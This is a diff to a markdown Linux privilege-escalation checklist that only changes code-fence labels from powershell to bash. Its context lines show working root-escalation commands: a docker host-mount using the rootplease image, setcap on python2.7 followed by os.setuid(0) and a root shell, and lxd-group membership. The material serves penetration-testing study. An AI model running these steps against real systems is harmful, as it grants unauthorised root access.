@@ -269,7 +269,7 @@ cat /etc/nsswitch.conf
 
 **Linux Privilege Escalation: Full Checklist**
 
-```powershell
+```bash
 $ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
 latest: Pulling from chrisfosterelli/rootplease
 2de59b831a23: Pull complete 
@@ -327,7 +327,7 @@ sudo -l
 
 **Linux Privilege Escalation: Full Checklist**
 
-```powershell
+```bash
 $ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7
 
 $ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
@@ -350,7 +350,7 @@ uid=0(root) gid=1000(swissky)
 
 **Linux Privilege Escalation: Full Checklist**
 
-```powershell
+```bash
 ╭─swissky@lab ~  
 ╰─$ id
 uid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel)
@@ -932,6 +932,8 @@ ps aux
 - [Official documentation 1](https://www.gnu.org/software/coreutils/manual/html_node/id-invocation.html)
 
 {/* VAULT_RELATED_START */}
+
+---
 
 **Source material and related references**
 
